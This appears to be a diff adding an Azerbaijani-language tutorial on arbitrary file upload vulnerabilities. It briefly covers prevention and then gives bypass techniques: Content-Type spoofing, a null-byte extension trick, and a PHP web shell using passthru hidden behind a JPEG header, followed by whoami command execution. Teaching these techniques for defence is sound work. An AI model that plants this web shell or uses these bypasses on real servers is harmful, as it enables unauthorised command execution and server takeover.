@@ -1,0 +1,56 @@
+                                                                                Arbitrary File Upload Vulnerability Nədir?
+arbitarary file upload vulnerability , bir pentesterin servere zərərli faylları yükləməsi ilə tanınan boşluqdur .
+Bu, fayl növünün düzgün şəkildə yoxlamayan(və ya bypass edilən ) bir web servervində boşluqdan yararlanaraq edilir. 
+Fayl Servere yükləndikdən sonra, bu fayllar serverin təhlükəsizliyini keçmək beləliklə servere shell upload etmek , icazə(access) yüksəltmək kimi digər zərərli proseslər üçün istifadə olunur.
+                                                                                
+
+                                                                                Harda Qarşılaşmaq olar ?
+File Upload prosesi adətən sosyal medya, blog vəya fayl paylaşma(upload) saytlarında rast gəlinir . Ancaq saytlarda profil şəkillərinin upload hissəsində vs yerlərdədə rast gəlinir . 
+
+                                                                                Qarşısı Necə Alınır ?
+Bildiyimiz kimi backend yazanlar bunlara diqqət etməlidir .Upload edilən faylın content-type , fayl uzantısı , fayl contenti doğrulaması ilə filterləməsi aparılır . 
+Məsələn backend yazan proqramçı sadəcə ölçüsü 200kb olan və uzantısı .jpg ve .png olan faylların uploadına icazə verməlidir . Qısacası filterləmə olmasa nəticəsi pis ola bilər .
+
+                                                                                Filterləmədən Necə Qaçmaq Olar ? 
+1 ) Content-Type Doğrulaması Bypass :
+Content-Type doğrulaması bypass : Bir çox web saytlar content-type yoxlamaq üçün faylın sadəcə ilk 2-3 baytını yoxlayır.Y
+Yüklənən faylın ilk baytlarınıdaki datanı dəyişdirərək , serverin faylın həqiqi content-type səhv yapılandıra bilərik . Beləliklə fayl servere upload olar və istədiyimiz əməliyyatı yerinə gətirərik.
+
+2 ) Fayl uzantısı adı ile doğrulama Bypass:
+Fayl uzantısı adı ile doğrulaması Python Dilində bu şəkildədir : 
+fayladi = input()
+uzantı = fayladi.split(".")[-1]
+if uzantı == "jpg":
+    print("Sisteme Upload Edildi")
+else:
+    print("Fayl Uzantısı Yanlışdır")
+Gördüyümüz kimi daxil edilən fayl adını nöqtəyə qədər bölür . əgər uzantı == jpg deməli fayl formatı jpg dir. 
+
+                                                                                 Necə Bypass etməliyik?
+
+Bunu da fayl adında Null Byte (%00) istifadə edərək bypass edə bilərik . shell.php%00.jpg 
+
+3 ) Fayl Contenti Doğrulama Bypass :
+Fayl Contenti ilə doğrulamada isə adətən contentin header'ı yoxlanılır . 
+.jpg faylının headeri : 
+JFIF\x00
+ÿØÿà ..JF IF..
+
+Əvvəlcə bir .jpg faylı yaradın. Binary data içərisinə ən başda JFIF\x00ÿØÿà / ..JF IF.. vəya qəbul
+edilən başqa bir uzantının headerını yazarıq. Əgər web sayt faylı headerı oxuyaraq(yəni Fayl Contenti Doğrulama ilə) serverə yükləyirsə
+image faylımız artıq serverdə olacaqdır . Yükləmədən əvvəl binary data içərisinə PHP kodumuzu 
+yaza bilərik.
+
+JFIF\x00
+<?php 
+echo passthru($_GET['xy']); ?>
+(...digerbinarydata...)
+
+şəklində php kodunu yazırıq və serverə upload edirik .
+http://numune.com/numune/1/2/shell.php shellimizi tapdıq.
+http://x.x.x.x/deneme/1/2/shell.php?xy=whoami enterləyək cavab: root olacaq artıq shell upload ettik . 
+Son olaraq shell.php?xy=whoami xy yerinə binary data içərisinə kod yazanda dəyişən adını fərqli yaza bilərdik . Yəni xy bir əhəmiyyəti yoxdur istəsəz 'user' yazın
+
+
+
+
